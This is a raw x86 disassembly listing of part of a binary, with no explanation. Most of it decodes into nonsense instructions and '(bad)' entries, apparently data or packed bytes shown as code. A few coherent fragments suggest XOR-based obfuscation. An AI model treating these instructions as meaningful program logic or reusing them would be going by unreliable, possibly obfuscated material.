  4075a9:	jmp    0x407600
  4075ab:	out    dx,al
  4075ac:	and    ebx,DWORD PTR [ebp-0x57]
  4075af:	loope  0x4075b4
  4075b1:	stos   DWORD PTR es:[edi],eax
  4075b2:	stos   DWORD PTR es:[edi],eax
  4075b3:	shl    DWORD PTR [edx-0x5b],cl
  4075b6:	invd   
  4075b8:	in     al,dx
  4075b9:	jmp    0x6994ca25
  4075be:	ret    0x432a
  4075c1:	jnp    0x407585
  4075c3:	iret   
  4075c4:	add    BYTE PTR [eax-0x2548b628],0x49
  4075cb:	and    al,0x8
  4075cd:	cmp    DWORD PTR [ebp+0x10],eax
  4075d0:	test   al,0x43
  4075d2:	pop    ss
  4075d3:	xchg   esi,eax
  4075d4:	mov    esp,0x5d351da6
  4075d9:	mov    ss:0xd96692ef,al
  4075df:	(bad)  
  4075e0:	xor    eax,0xcfa95427
  4075e5:	xchg   ecx,eax
  4075e6:	pop    es
  4075e7:	jmp    FWORD PTR [edi-0x65772b57]
  4075ed:	add    al,BYTE PTR [esi+0x2c]
  4075f0:	xchg   edi,eax
  4075f1:	push   esp
  4075f2:	xchg   ecx,eax
  4075f3:	aad    0xe4
  4075f5:	push   eax
  4075f6:	jb     0x407658
  4075f8:	xchg   DWORD PTR cs:[edi+esi*2+0x6fd726b5],ebp
  407600:	jno    0x40763f
  407602:	xor    BYTE PTR [edx+0x37],ah
  407605:	add    ecx,DWORD PTR [ecx-0x1c1a2684]
  40760b:	and    DWORD PTR [edi+0x201c7fde],eax
  407611:	in     eax,dx
  407612:	in     eax,0xc
  407614:	and    BYTE PTR [ecx],0x6
  407617:	dec    ebp
  407618:	test   eax,0x334d25b6
  40761d:	cmc    
  40761e:	or     ch,BYTE PTR [ecx+0x49]
  407621:	sbb    edx,DWORD PTR [edi+eax*2+0x42b9b8fe]
  407628:	push   es
  407629:	mov    al,ds:0x8de18ced
  40762e:	(bad)  
  40762f:	xchg   edx,eax
  407630:	sbb    esi,esi
  407632:	ret    
  407633:	call   0x7845ef00
  407638:	daa    
  407639:	sbb    al,0xeb
  40763b:	and    cl,BYTE PTR [esi+esi*2-0x7c]
  40763f:	lea    esi,[ecx+0x6d]
  407642:	pushf  
  407643:	jl     0x40761b
  407645:	(bad)  
  407646:	ins    BYTE PTR es:[edi],dx
  407647:	xor    eax,0x89fbe7c9
  40764c:	jle    0x407652
  40764e:	jmp    0x4083e6
  407653:	mov    eax,DWORD PTR [ebp-0x24]
  407656:	add    eax,DWORD PTR [ebp-0x4]
  407659:	mov    DWORD PTR [ebp-0x28],eax
  40765c:	mov    eax,DWORD PTR [ebp-0x28]
  40765f:	mov    eax,DWORD PTR [ebp-0x4]
  407662:	mov    eax,DWORD PTR [ebp-0x28]
  407665:	mov    eax,DWORD PTR [eax+0xc]
  407668:	mov    edx,DWORD PTR [ebp-0x4]
  40766b:	movzx  eax,WORD PTR [edx+eax*1]
  40766f:	cdq    
  407670:	shld   edx,eax,0x2
  407674:	xor    edx,ecx
  407676:	mov    DWORD PTR [ebp+0xc],edx
  407679:	jmp    0x407a1a
  40767e:	sbb    BYTE PTR [edi-0x2f],cl
  407681:	pop    esi
  407682:	call   0x3e77:0x3eb7bc64
  407689:	fld    QWORD PTR [edi+0x6f]
  40768c:	iret   
  40768d:	nop
  40768e:	mov    esi,0xbdbebe57
  407693:	les    edi,FWORD PTR [esi+0x3b230be]
  407699:	les    ebx,FWORD PTR [eax-0x3e]
  40769c:	aaa    
  40769d:	and    eax,0x1fb4c799
  4076a2:	je     0x4076e9
  4076a4:	stos   BYTE PTR es:[edi],al
  4076a5:	push   0x3d173ff5
  4076aa:	xchg   esp,eax
  4076ab:	shl    ecx,0x92
  4076ae:	lods   eax,DWORD PTR ds:[esi]
  4076af:	pop    ebp
  4076b0:	push   cs
  4076b1:	leave  
  4076b2:	pop    es
  4076b3:	daa    
  4076b4:	sub    al,0x4f
  4076b6:	xor    esi,eax
  4076b8:	mov    al,ds:0xf3d0b28
  4076bd:	call   0x90f8:0x4a42eff3
  4076c4:	jle    0x407742
  4076c6:	mov    eax,ds:0xeb09df3c
  4076cb:	jecxz  0x4076fa
  4076cd:	mov    dl,0xc5
  4076cf:	(bad)  
  4076d0:	fwait
  4076d1:	push   0xffffffe8
  4076d3:	nop
  4076d4:	pop    edx
  4076d5:	pop    esi
  4076d6:	rcr    BYTE PTR [ecx],1
  4076d8:	out    0xad,eax
  4076da:	test   eax,0x2581b753
  4076df:	in     al,0x58
  4076e1:	push   ds
  4076e2:	and    al,0x18
  4076e4:	or     al,0x90
  4076e6:	fxch   st(4)
  4076e8:	int    0x19
  4076ea:	test   BYTE PTR [ecx],ah
  4076ec:	(bad)  
  4076ed:	out    dx,eax
  4076ee:	pop    eax
  4076ef:	adc    DWORD PTR [eax-0x7b],esp
  4076f2:	and    al,0xaf
  4076f4:	int3   
  4076f5:	test   DWORD PTR [edi+0x241ca6f9],esi
  4076fb:	retf   0x669f
  4076fe:	pop    ss
  4076ff:	jmp    0xb0ba:0xf9774115
  407706:	mov    DWORD PTR [edx-0x160c13b],edx
  40770c:	xor    al,0xd0
  40770e:	xor    eax,0x2f882b3
  407713:	jmp    0x407779
  407715:	jo     0x407701
  407717:	das    
  407718:	sbb    bh,0x2f
  40771b:	mov    cl,0xd7
  40771d:	dec    ebp
  40771e:	jbe    0x4076c8
  407720:	out    0x41,al
  407722:	in     al,dx
  407723:	push   edx
  407724:	cmp    ecx,DWORD PTR [esi+ecx*2]
  407727:	dec    eax
  407728:	stos   BYTE PTR es:[edi],al
  407729:	push   0x7ff62ef4
  40772e:	add    BYTE PTR [ebx-0x246a6c5e],cl
  407734:	loopne 0x407786
  407736:	sbb    eax,ebx
  407738:	(bad)  
  407739:	into   
  40773a:	adc    ebp,esp
  40773c:	test   al,0xa5
  40773e:	inc    esp
  40773f:	xor    DWORD PTR [esi-0x7b],eax
  407742:	adc    DWORD PTR [ebx+0x19],edi
  407745:	cld    
  407746:	fwait
  407747:	leave  
  407748:	xor    edx,DWORD PTR [ecx+0x8e920f9]
  40774e:	mov    eax,ds:0x8be31d7d
  407753:	les    ebx,FWORD PTR [edi+0x5061c2a9]
  407759:	add    DWORD PTR [ebx+0x5e6ff11e],esi
  40775f:	jae    0x4077ab
  407761:	cmp    bl,dh
  407763:	mov    al,0xbb
  407765:	aam    0xfd
  407767:	mov    bl,0x71
  407769:	fisubr DWORD PTR [eax]
  40776b:	nop
  40776c:	adc    BYTE PTR ds:0x7c660e67,al
  407772:	jmp    0x40773f
  407774:	sbb    ebx,DWORD PTR [edx+eiz*8-0x51]
  407778:	sub    eax,0x322cf07e
  40777d:	not    al
  40777f:	jge    0x407779
  407781:	xchg   ebp,eax
  407782:	(bad)  
  407783:	imul   ebp,ecx,0xb9887796
  407789:	fwait
  40778a:	retf   0x98d3
  40778d:	mov    edi,0x1d08a580
  407792:	mov    ds:0xccac82f6,al
  407797:	mov    dl,BYTE PTR [ecx*8+0xf7a34c1]
  40779e:	xor    DWORD PTR [edx+0x525fc2b8],ebx
  4077a4:	xchg   edi,eax
  4077a5:	loopne 0x407783
  4077a7:	mov    ds,WORD PTR [esi+0x2554459a]
  4077ad:	rol    DWORD PTR [eax],1
  4077af:	jnp    0x407818
  4077b1:	push   eax
  4077b2:	test   eax,0x1a055bc8
  4077b7:	mov    edi,0xf1dba53d
  4077bc:	stos   DWORD PTR es:[edi],eax
  4077bd:	rcl    DWORD PTR [ebx-0x5f1fd172],1
  4077c3:	ret    
  4077c4:	loop   0x4077c9
  4077c6:	sbb    eax,esi
  4077c8:	popf   
  4077c9:	sbb    DWORD PTR [ebx-0x187cfcce],0x1
  4077d0:	inc    ebx
  4077d1:	pop    es
  4077d2:	mov    cs,WORD PTR [eax+0x12]
  4077d5:	imul   ecx,DWORD PTR [esi+0x3f82c0e3],0x13773905
  4077df:	push   ecx
  4077e0:	sbb    al,0x13
  4077e2:	jg     0x407859
  4077e4:	mov    ecx,0xfeabccfd
  4077e9:	enter  0xf313,0x20
  4077ed:	in     al,0x97
  4077ef:	dec    esp
  4077f0:	xor    BYTE PTR [eax+edx*4+0x16f3cb89],bh
  4077f7:	int    0x5c
  4077f9:	jmp    DWORD PTR [ebx]
  4077fb:	push   0xad10360b
  407800:	or     DWORD PTR [ecx],ecx
  407802:	push   ss
  407803:	adc    al,0x40
  407805:	mov    ds:0x7dd3ded6,eax
  40780a:	cdq    
  40780b:	mov    eax,0x35bb091d
  407810:	jge    0x4077e9
  407812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407813:	push   ecx
  407814:	enter  0x7c7f,0x2d
  407818:	jge    0x4077b6
  40781a:	mov    bh,0xa0
  40781c:	pop    ss
  40781d:	pop    ecx
  40781e:	mov    dh,0x5e
  407820:	jmp    0x407834
  407822:	jle    0x407803
  407824:	pop    ebp
  407825:	jb     0x407885
  407827:	rcr    DWORD PTR [esp+edi*1+0x1],1
  40782b:	mov    ebp,cs
  40782d:	jle    0x4077b4
  40782f:	imul   ebx,ebp,0xffffffc1
  407832:	adc    ch,BYTE PTR [ebp+0x62758632]
  407838:	(bad)  [ebx+0x1e]
  40783b:	dec    edx
  40783c:	dec    eax
  40783d:	adc    eax,0xe9aa312f
  407842:	cmp    esi,0x7405e4b
  407848:	jle    0x4078b3
  40784a:	push   esp
  40784b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40784c:	xor    edi,DWORD PTR [edx+ebp*8-0x5d]
  407850:	jno    0x407823
  407852:	sbb    al,0xe1
  407854:	push   ds
  407855:	dec    edx
  407856:	push   esi
  407857:	sub    bl,BYTE PTR [esi-0x3852f20d]
  40785d:	add    BYTE PTR [ecx],cl
  40785f:	pop    esi
  407860:	repz adc al,0x93
  407863:	addr16 xchg ebx,eax
  407865:	popf   
  407866:	add    ecx,DWORD PTR [edx-0x44]
  407869:	mov    edi,0xc1dad17f
  40786e:	xchg   ebx,eax
  40786f:	setb   BYTE PTR [edx+0xc]
  407873:	mov    edi,0x25a6b0ea
  407878:	mov    ch,BYTE PTR [ebx]
  40787a:	int3   
  40787b:	(bad)  
  40787c:	sbb    BYTE PTR [ecx+0x3edf8420],bh
  407882:	loope  0x4078ca
  407884:	aam    0x41
  407886:	mov    ecx,0x50515f00
  40788b:	xlat   BYTE PTR ds:[ebx]
  40788c:	mov    bl,0xda
  40788e:	mov    cl,0x8c
  407890:	das    
  407891:	loop   0x407852
  407893:	das    
  407894:	xchg   DWORD PTR [ecx],ebx
  407896:	retf   0x9da9
  407899:	lock pushf 
  40789b:	(bad)  
  40789c:	and    BYTE PTR [edi-0x6d],bl
  40789f:	mov    edx,edx
  4078a1:	(bad)  
  4078a3:	adc    al,0xf6
  4078a5:	push   0x1d676fff
  4078aa:	sti    
  4078ab:	fbstp  TBYTE PTR [ecx]
  4078ad:	cmp    DWORD PTR [ecx],edi
  4078af:	jg     0x4078c0
  4078b1:	pop    edi
  4078b2:	dec    ecx
  4078b3:	imul   ecx,DWORD PTR [eax],0x2afb2437
  4078b9:	mov    DWORD PTR [edx],esp
  4078bb:	in     al,dx
  4078bc:	jne    0x40785a
  4078be:	or     eax,0x4e1f8265
  4078c3:	mov    ds:0x2a25e22f,al
  4078c8:	sub    al,0xb2
  4078ca:	retf   
  4078cb:	je     0x40792a
  4078cd:	jne    0x4078a0
  4078cf:	mov    esi,0x84291e2e
  4078d4:	cs call 0x217b:0x8d62419b
  4078dc:	iret   
  4078dd:	call   0xdb2d:0xf3cc4b33
  4078e4:	leave  
  4078e5:	cdq    
  4078e6:	rol    DWORD PTR [ecx+0x20f593d8],cl
  4078ec:	cmc    
  4078ed:	test   BYTE PTR [esi+0x13],bh
  4078f0:	aam    0xfd
  4078f2:	in     eax,dx
  4078f3:	clc    
  4078f4:	cmp    BYTE PTR [ecx],bl
  4078f6:	xchg   esp,eax
  4078f7:	mov    al,0xcd
  4078f9:	rcl    BYTE PTR [ebp+0x47],1
  4078fc:	jb     0x407882
  4078fe:	jno    0x4078ad
  407900:	jp     0x407931
  407902:	cmp    al,0x21
  407904:	dec    eax
  407905:	int3   
  407906:	fwait
  407907:	push   edx
  407908:	and    ch,BYTE PTR [esi-0x7f]
  40790b:	jl     0x4078ed
  40790d:	inc    esi
  40790e:	adc    eax,esp
  407910:	inc    ebp
  407911:	imul   esp,DWORD PTR cs:[ebp+0x136b703],0x92ff03ee
  40791c:	mov    ebp,0x88d48738
  407921:	(bad)
  407925:	in     eax,0xdb
  407927:	out    dx,al
  407928:	loop   0x4078b8
  40792a:	jo     0x407920
  40792c:	cli    
  40792d:	je     0x407959
  40792f:	mov    dh,0x65
  407931:	mov    DWORD PTR [ebx-0x64bb9eda],esp
  407937:	push   0x1a
  407939:	fwait
  40793a:	adc    edi,DWORD PTR [ebx+0x6a]
  40793d:	dec    esp
  40793e:	call   0x8e01f47b
  407943:	lds    ebx,FWORD PTR ds:0xdc844631
  407949:	sahf   
  40794a:	sar    DWORD PTR [esi+ecx*2],cl
  40794d:	xor    eax,0x336b47b0
  407952:	in     al,0x89
  407954:	jb     0x407912
  407956:	jns    0x407944
  407958:	push   ebx
  407959:	jb     0x40797c
  40795b:	add    BYTE PTR [ecx],al
  40795d:	test   eax,0xd7272277
  407962:	imul   eax,edx,0x411b0479
  407968:	ret    0xadac
  40796b:	sbb    esp,DWORD PTR [edx+edx*8-0x40]
  40796f:	add    BYTE PTR [esi+0x2e],dl
  407972:	int    0xa6
  407974:	mov    ch,0xa7
  407976:	pop    ebp
  407977:	and    DWORD PTR [esi],0xfffffff1
  40797a:	xchg   ebx,eax
  40797b:	sub    BYTE PTR [eax+0x3b],dl
  40797e:	add    esi,DWORD PTR [esi+0x76]
  407981:	icebp  
  407982:	xchg   ebp,eax
  407983:	mov    fs,WORD PTR [edi-0x7b]
  407986:	fild   QWORD PTR [ebx-0x6b62f697]
  40798c:	nop
  40798d:	fcmovb st,st(2)
  40798f:	daa    
  407990:	shld   esp,edi,cl
  407993:	xor    eax,0xc9ae53b3
  407998:	outs   dx,DWORD PTR ds:[esi]
  407999:	int3   
  40799a:	cmp    DWORD PTR [esi+0x76],ebp
  40799d:	icebp  
  40799e:	arpl   WORD PTR [esp+edx*4-0x5f6bd4ec],bp
  4079a5:	push   esp
  4079a6:	pushf  
  4079a7:	aaa    
  4079a8:	cwde   
  4079a9:	inc    edi
  4079aa:	pop    ds
  4079ab:	call   0x8e34:0x15122d38
  4079b2:	add    edx,DWORD PTR [esi-0x5b]
  4079b5:	out    0x9c,al
  4079b7:	sbb    eax,0x4fa6fe5f
  4079bc:	call   0xc78c:0xb5a80398
  4079c3:	dec    ebp
  4079c4:	fcomp  DWORD PTR ds:0x2f5f116f
  4079ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079cb:	hlt    
  4079cc:	dec    ebx
  4079cd:	pusha  
  4079ce:	pop    eax
  4079cf:	in     eax,0x8c
  4079d1:	pushf  
  4079d2:	retf   
  4079d3:	test   DWORD PTR [edi-0x495454aa],0x29721d8
  4079dd:	rol    BYTE PTR [edi+0x5195e927],cl
  4079e3:	ins    BYTE PTR es:[edi],dx
  4079e4:	jp     0x407a16
  4079e6:	jg     0x407984
  4079e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079ea:	add    cl,BYTE PTR [eax-0x6399d456]
  4079f0:	xchg   esi,eax
  4079f1:	add    eax,0x58c54498
  4079f6:	xchg   DWORD PTR [esi+0x45a105c5],eax
  4079fc:	mov    eax,ds:0x1aedbd34
  407a01:	(bad)  
  407a02:	mov    ecx,0x633cb7a7
  407a07:	cmp    edi,eax
  407a09:	xchg   esi,eax
  407a0a:	sbb    eax,0x7c62f133
  407a0f:	mov    bl,0xdb
  407a11:	retf   0xee75
  407a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a15:	xchg   edx,eax
  407a16:	loop   0x407a94
  407a18:	icebp  
  407a19:	cwde   
  407a1a:	mov    edx,DWORD PTR [ebp-0x58]
  407a1d:	shl    eax,0x2
  407a20:	mov    DWORD PTR [ebp+0x10],edx
  407a23:	mov    edx,DWORD PTR [ebp-0x54]
  407a26:	xor    eax,0xcb79b576
  407a2b:	mov    DWORD PTR [ebp+0x14],edx
  407a2e:	cmp    eax,DWORD PTR [ebp+0x10]
  407a31:	jne    0x408352
  407a37:	mov    eax,edx
  407a39:	cmp    DWORD PTR [ebp+0xc],eax
  407a3c:	jne    0x408352
  407a42:	mov    DWORD PTR [ebp+0x8],0xcb79b576
  407a49:	mov    DWORD PTR [ebp+0xc],ecx
  407a4c:	mov    DWORD PTR [ebp-0x60],0xcb79b572
  407a53:	mov    DWORD PTR [ebp-0x5c],ecx
  407a56:	mov    DWORD PTR [ebp-0x48],0xcb79b57e
  407a5d:	mov    DWORD PTR [ebp-0x44],ecx
  407a60:	mov    DWORD PTR [ebp-0x38],0xcb79b57a
  407a67:	mov    DWORD PTR [ebp-0x34],ecx
  407a6a:	mov    eax,DWORD PTR [ebp+0x8]
  407a6d:	jmp    0x407e0e
  407a72:	cmp    eax,0x2444c2a4
  407a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a78:	inc    eax
  407a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a7a:	ret    0x7a7b
  407a7d:	xchg   edx,eax
  407a7e:	call   0xbdd2b4d9
  407a83:	pop    ebp
  407a84:	mov    esi,0xbec4bdbe
  407a89:	mov    esi,0xdcb81cb0
  407a8e:	jno    0x407ae5
  407a90:	ins    DWORD PTR es:[edi],dx
  407a91:	aad    0x13
  407a93:	rcl    esp,cl
  407a95:	jnp    0x407a8f
  407a97:	xchg   ebp,eax
  407a98:	inc    esp
  407a99:	dec    esi
  407a9a:	mov    eax,ds:0x9aa7c84a
  407a9f:	fild   WORD PTR [edx-0x7f]
  407aa2:	sub    BYTE PTR [edi-0x2d3db438],0xb4
  407aa9:	fs stos DWORD PTR es:[edi],eax
  407aab:	sbb    eax,0x56b457de
  407ab0:	cli    
  407ab1:	dec    ebx
  407ab2:	jg     0x407aca
  407ab4:	cld    
  407ab5:	and    esi,DWORD PTR [esi+0x4a]
  407ab8:	test   BYTE PTR [eax],cl
  407aba:	mov    bl,0x97
  407abc:	scas   al,BYTE PTR es:[edi]
  407abd:	mov    esi,0x7f58ab34
  407ac2:	jmp    0x407a7a
  407ac4:	add    esi,esi
  407ac6:	xchg   ebp,eax
  407ac7:	sbb    bh,BYTE PTR [edi]
  407ac9:	call   0xeb2db1fe
  407ace:	nop
  407acf:	in     eax,dx
  407ad0:	pop    es
  407ad1:	sub    ebp,DWORD PTR [ebx-0x4c09a7f4]
  407ad7:	sti    
  407ad8:	jnp    0x407b51
  407ada:	xchg   edi,eax
  407adb:	sub    al,0x89
  407add:	std    
  407ade:	sbb    edi,DWORD PTR [ebp+0x61811054]
  407ae4:	call   0xd06bba0b
  407ae9:	outs   dx,BYTE PTR ds:[esi]
  407aea:	xchg   esp,eax
  407aeb:	cmp    BYTE PTR [ecx+0x1],cl
  407aee:	jecxz  0x407b54
  407af0:	push   DWORD PTR [edi+0x71dd2a16]
  407af6:	mov    ds:0x8be88ef5,eax
  407afb:	dec    ecx
  407afc:	fist   WORD PTR [eax-0x1b]
  407aff:	jg     0x407ab6
  407b01:	push   eax
  407b02:	les    ebp,FWORD PTR [edi+0x2a78beda]
  407b08:	mul    BYTE PTR [esi+eiz*1+0x1e50b2e6]
  407b0f:	cmp    ch,BYTE PTR [edi+0x5e46b6ed]
  407b15:	cs jno 0x407adb
  407b18:	loope  0x407aec
  407b1a:	imul   ebp,DWORD PTR [eax+ebx*8+0x59],0x395617ad
  407b22:	aam    0xa5
  407b24:	jno    0x407b1c
  407b26:	jnp    0x407b93
  407b28:	(bad)  
  407b29:	sub    BYTE PTR [ebp-0xe],ch
  407b2c:	in     al,0x5b
  407b2e:	popf   
  407b2f:	iret   
  407b30:	imul   edx,DWORD PTR ds:0xbc5c0d19,0x1c
  407b37:	and    al,0xbd
  407b39:	enter  0xdde6,0xde
  407b3d:	bound  ecx,QWORD PTR [ebp+0x36]
  407b40:	xor    esi,ebx
  407b42:	loope  0x407af3
  407b44:	pop    ebx
  407b45:	pop    edx
  407b46:	fcmovnu st,st(6)
  407b48:	dec    edx
  407b49:	call   0xcaf7:0x9012e522
  407b50:	outs   dx,DWORD PTR ds:[esi]
  407b51:	ret    
  407b52:	icebp  
  407b53:	jmp    0x39d52872
  407b58:	lea    eax,[ebx-0x2f]
  407b5b:	pop    eax
  407b5c:	stos   DWORD PTR es:[edi],eax
  407b5d:	neg    DWORD PTR [edx+eax*8]
  407b60:	mov    bh,0x94
  407b62:	mov    eax,0xf15e565c
  407b67:	nop
  407b68:	sbb    al,0x83
  407b6a:	add    al,0xbd
  407b6c:	mov    dh,0x88
  407b6e:	mov    cl,0xec
  407b70:	shl    BYTE PTR [esi],1
  407b72:	js     0x407bad
  407b74:	std    
  407b75:	clc    
  407b76:	or     DWORD PTR [ecx+0x3b],eax
  407b79:	out    dx,eax
  407b7a:	popf   
  407b7b:	inc    edi
  407b7c:	push   ecx
  407b7d:	hlt    
  407b7e:	test   eax,0x46c71d9e
  407b83:	cmp    eax,esi
  407b85:	(bad)  
  407b87:	dec    ebp
  407b88:	sbb    al,0x94
  407b8a:	dec    edi
  407b8b:	and    dl,BYTE PTR [ebx+0x43]
  407b8e:	test   eax,0xeea5f6bb
  407b93:	jne    0x407be5
  407b95:	ds xchg esp,eax
  407b97:	sbb    ebp,eax
  407b99:	mov    ss,eax
  407b9b:	xchg   ebp,eax
  407b9c:	dec    ecx
  407b9e:	sub    ebx,eax
  407ba0:	call   0x1ef6:0x133cd802
  407ba7:	xor    al,0x63
  407ba9:	sbb    eax,0xec4c35b4
  407bae:	(bad)  
  407baf:	fist   DWORD PTR [ebx]
  407bb1:	fs pusha 
  407bb3:	xchg   DWORD PTR [ebp+0x8],esi
  407bb6:	add    al,0xa9
  407bb8:	dec    ebx
  407bb9:	mov    cl,0x4
  407bbb:	clc    
  407bbc:	pop    ecx
  407bbd:	fdiv   DWORD PTR [esi-0x25dd6c00]
  407bc3:	frstor [edx+0x2b]
  407bc6:	call   0xdfe9:0xdf268281
  407bcd:	es add eax,0xf5fc63bc
  407bd3:	out    dx,eax
  407bd4:	push   ecx
  407bd5:	pop    ebx
  407bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bd7:	cs add edi,edx
  407bda:	test   BYTE PTR [ecx],dh
  407bdc:	pop    eax
  407bdd:	mov    edi,0x67a23902
  407be2:	adc    BYTE PTR [ebp+0x59bdbaa],al
  407be8:	dec    esi
  407be9:	adc    eax,0x9c87c78a
  407bee:	(bad)  
  407bef:	fild   DWORD PTR [esi-0x74]
  407bf2:	mov    ss,WORD PTR ds:0xd91b6683
  407bf8:	mov    eax,ds:0xf5f87379
  407bfd:	test   al,0xee
  407bff:	rcl    BYTE PTR [edx-0x33dbb650],cl
  407c05:	out    0xc2,eax
  407c07:	inc    edx
  407c08:	sbb    edi,DWORD PTR [ebx]
  407c0a:	sbb    ebp,DWORD PTR [esi-0x3d]
  407c0d:	test   ch,0xab
  407c10:	call   0xff5597ea
  407c15:	cmp    eax,0xc03c754e
  407c1a:	or     al,dl
  407c1c:	leave  
  407c1d:	sar    bl,1
  407c1f:	xor    eax,ebp
  407c21:	jp     0x407c0f
  407c23:	mov    WORD PTR [ebx+0x7b],ss
  407c26:	retf   
  407c27:	mul    DWORD PTR [ebx]
  407c29:	push   edi
  407c2a:	mov    al,0xe8
  407c2c:	sub    BYTE PTR [ebx],dh
  407c2e:	(bad)  
  407c2f:	add    bl,bl
  407c31:	push   0xffffffa5
  407c33:	pop    esp
  407c34:	or     dh,BYTE PTR [edx-0x51]
  407c37:	or     edx,DWORD PTR [edx-0xead0476]
  407c3d:	es jmp 0x64b8:0xeaab7842
  407c45:	push   0x8a29da99
  407c4a:	pop    es
  407c4b:	or     al,0x40
  407c4d:	cmp    DWORD PTR [esi-0x4a],0xfffffff4
  407c51:	outs   dx,DWORD PTR ds:[si]
  407c53:	sbb    ecx,eax
  407c55:	pop    edi
  407c56:	stos   DWORD PTR es:[edi],eax
  407c57:	mov    cs,WORD PTR ds:0xcdee511b
  407c5d:	sbb    DWORD PTR [ebp+0x72],esi
  407c60:	mov    edi,0xb15a6a02
  407c65:	ja     0x407c95
  407c67:	jb     0x407c21
  407c69:	pop    edi
  407c6a:	adc    DWORD PTR [ecx-0x1],0xffffffa0
  407c6e:	stc    
  407c6f:	cmp    eax,0x60781769
  407c74:	dec    eax
  407c75:	mov    edi,0x6b9cf7a7
  407c7a:	shr    dl,0xc8
  407c7d:	jge    0x407c45
  407c7f:	mov    ebx,0x9a897a4b
  407c84:	dec    ebp
  407c85:	loop   0x407c80
  407c87:	cmp    ecx,DWORD PTR [eax+0x1c46fd92]
  407c8d:	or     esi,DWORD PTR [esi+0x6a]
  407c90:	test   al,0x6d
  407c92:	mov    eax,0x53bc775
  407c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c98:	fstp   QWORD PTR [esi]
  407c9a:	and    ebx,edx
  407c9c:	and    ecx,DWORD PTR [ebx-0x6bb6a291]
  407ca2:	cwde   
  407ca3:	fld    QWORD PTR [eax+eiz*1]
  407ca6:	hlt    
  407ca7:	xchg   esp,eax
  407ca8:	dec    dx
  407caa:	mov    cl,0x96
  407cac:	xchg   edi,eax
  407cad:	pop    esi
  407cae:	jl     0x407c57
  407cb0:	xchg   ebp,eax
  407cb1:	scas   al,BYTE PTR es:[edi]
  407cb2:	cmp    al,0x2
  407cb4:	fs enter 0x94fb,0xa8
  407cb9:	add    al,BYTE PTR [eax+0x369adc39]
  407cbf:	mov    ds:0xa1763737,eax
  407cc4:	aaa    
  407cc5:	sar    DWORD PTR [edx-0x6f],1
  407cc8:	lods   eax,DWORD PTR ds:[esi]
  407cc9:	not    DWORD PTR [edx+edi*1]
  407ccc:	pop    esp
  407ccd:	dec    edi
  407cce:	repz push ecx
  407cd0:	adc    al,0x68
  407cd2:	mov    ch,0xd9
  407cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cd5:	and    DWORD PTR [ebp+0x395ea881],edx
  407cdb:	adc    BYTE PTR ds:[esi],dh
  407cde:	(bad)  
  407cdf:	int3   
  407ce0:	(bad)  
  407ce2:	ret    0xad92
  407ce5:	in     al,0xe2
  407ce7:	xor    BYTE PTR [ebx+0x35],bh
  407cea:	push   edi
  407ceb:	fwait
  407cec:	loop   0x407c75
  407cee:	cmp    eax,0x6f6dc2c6
  407cf3:	dec    ecx
  407cf4:	and    DWORD PTR [edi-0x5a83da0],0x5972e26b
  407cfe:	mov    al,ds:0x16f5cd51
  407d03:	outs   dx,DWORD PTR ds:[esi]
  407d04:	test   BYTE PTR [edx-0x1a],ah
  407d07:	inc    esi
  407d08:	scas   al,BYTE PTR es:[edi]
  407d09:	pop    ebx
  407d0a:	and    DWORD PTR [edi],esp
  407d0c:	ins    DWORD PTR es:[edi],dx
  407d0d:	mov    bl,0x8d
  407d0f:	aad    0x3a
  407d11:	int    0x6d
  407d13:	and    bh,BYTE PTR [ecx]
  407d15:	xor    ebx,esp
  407d17:	push   esi
  407d18:	push   ecx
  407d19:	inc    eax
  407d1a:	gs or  ebx,edi
  407d1d:	call   FWORD PTR [ecx-0x51]
  407d20:	int    0xd1
  407d22:	sub    eax,DWORD PTR ds:0x27e8a803
  407d28:	sub    al,0x4b
  407d2a:	and    eax,0x43f26ef0
  407d2f:	push   cs
  407d30:	jl     0x407d42
  407d32:	dec    esi
  407d33:	lods   al,BYTE PTR ds:[esi]
  407d34:	fdiv   QWORD PTR [esi]
  407d36:	mov    esp,0x3ffe981f
  407d3b:	out    dx,al
  407d3c:	fwait
  407d3d:	cmc    
  407d3e:	js     0x407cc2
  407d40:	in     eax,dx
  407d41:	dec    ecx
  407d42:	jnp    0x407ccd
  407d44:	fwait
  407d45:	sub    dh,BYTE PTR [esi]
  407d47:	push   edi
  407d48:	fisub  WORD PTR [esi]
  407d4a:	inc    ebx
  407d4b:	aam    0x83
  407d4d:	sub    al,0xcc
  407d4f:	rep outs dx,DWORD PTR ds:[esi]
  407d51:	add    cl,bl
  407d53:	cmc    
  407d54:	arpl   dx,ax
  407d56:	jb     0x407d15
  407d58:	repz jl 0x407d0e
  407d5b:	rcr    DWORD PTR [eax+0x2a],0x93
  407d5f:	push   esi
  407d60:	out    dx,al
  407d61:	cwde   
  407d62:	jnp    0x407d81
  407d64:	ins    DWORD PTR es:[edi],dx
  407d65:	jg     0x407dbd
  407d67:	mov    al,ds:0x717eeffa
  407d6c:	dec    edx
  407d6d:	imul   eax,DWORD PTR [edi+0x37],0x28c83250
  407d74:	adc    BYTE PTR [edi],bl
  407d76:	(bad)  [edx]
  407d78:	push   cs
  407d79:	dec    ebp
  407d7a:	push   esi
  407d7b:	int3   
  407d7c:	add    dl,BYTE PTR [edi+ebx*1]
  407d7f:	and    eax,0x76297965
  407d84:	div    DWORD PTR [esi-0x11fbeedc]
  407d8a:	cld    
  407d8b:	xchg   ecx,eax
  407d8c:	xor    eax,0xc31cb0b5
  407d91:	shl    DWORD PTR [eax-0x73ab89c0],0x74
  407d98:	rcr    bl,1
  407d9a:	bound  edi,QWORD PTR cs:[ebp-0x59]
  407d9e:	or     ch,BYTE PTR [edi]
  407da0:	dec    eax
  407da1:	inc    esi
  407da2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407da3:	jae    0x407d77
  407da5:	jae    0x407d31
  407da7:	stos   BYTE PTR es:[edi],al
  407da8:	or     ebp,DWORD PTR [ecx]
